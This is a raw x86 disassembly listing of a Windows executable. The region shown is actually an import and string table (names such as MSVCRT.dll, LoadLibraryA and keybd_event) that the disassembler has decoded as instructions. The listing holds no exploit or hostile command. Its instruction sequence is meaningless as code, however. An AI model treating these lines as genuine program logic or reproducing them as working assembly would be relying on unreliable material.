  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
